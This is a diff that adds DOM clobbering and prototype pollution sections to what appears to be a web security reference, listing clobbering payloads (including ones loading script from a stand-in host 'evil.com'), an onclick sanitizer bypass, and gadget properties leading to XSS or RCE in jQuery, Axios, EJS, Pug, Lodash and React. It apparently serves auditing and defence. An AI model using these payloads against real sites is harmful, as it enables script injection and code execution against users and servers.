@@ -44,3 +44,59 @@
 - **Cookie injection / session fixation:** `document.cookie = userInput` — unsanitized value can set arbitrary cookies including `session` or `auth` tokens
 - **WebSQL (deprecated, still present in Chromium-based apps):** `db.executeSql(userInput)` — SQL injection in client-side SQLite
 - **Storage-based persistent XSS:** `localStorage.setItem(key, userInput)` — benign on write but creates a persistent XSS source if the stored value is later read and rendered unsanitized into the DOM
+
+---
+
+## DOM Clobbering Sinks
+
+HTML elements with `id` or `name` attributes create global variables that can override JavaScript properties. These are exploitable when user-controlled HTML is rendered (even after sanitization, since named elements are usually allowed).
+
+**High-value clobbering targets:**
+
+| Sink | Clobbering Payload | Impact |
+|------|-------------------|--------|
+| `document.currentScript.src` | `<img name="currentScript" src="//evil.com/x.js">` | Library loads from attacker URL → XSS |
+| `document.scripts` | `<img name="scripts">` | Breaks `document.scripts` iteration, enables injection |
+| `document.getElementById()` | `<form id="target"><input name="value" value="evil">` | Returns attacker-controlled element |
+| `window.someGlobal` | `<a id="someGlobal" href="//evil.com">` | Override global vars; `toString()` returns href |
+| `element.attributes` | `<form onclick=alert(1)><input id="attributes">` | Sanitizer bypass — `attributes` no longer NamedNodeMap |
+| `document.cookie` | `<img name="cookie">` | Breaks cookie-reading code, potential auth bypass |
+| `document.body` | `<img name="body">` | Breaks `document.body.appendChild()` and similar |
+
+**Two-level property clobbering:**
+`<a id="x"><a id="x" name="y" href="//evil.com">` → `x.y` returns the href string
+
+**Three-level property clobbering:**
+`<form id="x" name="y"><input id="z" value="controlled">` → `x.y.z.value`
+
+**Affected libraries (CVEs):**
+- Vite (CVE-2024-45812), Webpack (CVE-2024-43788), Astro (CVE-2024-47885), Rollup, Prism.js, MathJax, FilePond
+
+**Detection:** Search for `document.currentScript`, `document.scripts`, or any `document.*` property access that could be clobbered by HTML injection. Run in context where user HTML is rendered.
+
+---
+
+## Prototype Pollution Gadgets — Extended
+
+**jQuery gadgets:**
+- `$.fn.tooltip` defaults → XSS via `template` or `title` property pollution
+- `$.ajaxSetup` → pollute `url`, `headers`, or `data` to hijack all future AJAX requests
+
+**Axios gadgets:**
+- `axios.defaults.headers.common` → inject auth headers into all requests
+- `axios.defaults.baseURL` → redirect all API calls to attacker server
+
+**Express.js response gadgets:**
+- `Object.prototype.outputFunctionName` → EJS RCE (well-known)
+- `Object.prototype.escapeFunction` → EJS RCE (alternative path)
+- `Object.prototype.compileDebug` → Pug debug mode injection
+- `Object.prototype.self` → Pug code injection
+- `Object.prototype.block` → Pug RCE via block override
+
+**Lodash/Underscore template gadgets:**
+- `_.template` with `variable` property polluted → template compilation RCE
+- `_.defaults` / `_.defaultsDeep` as pollution entry point + `_.template` as gadget
+
+**React/Next.js gadgets:**
+- `dangerouslySetInnerHTML` via polluted props → XSS
+- Server Component prop deserialization → potential RCE (React2Shell, CVE-2025-55182)
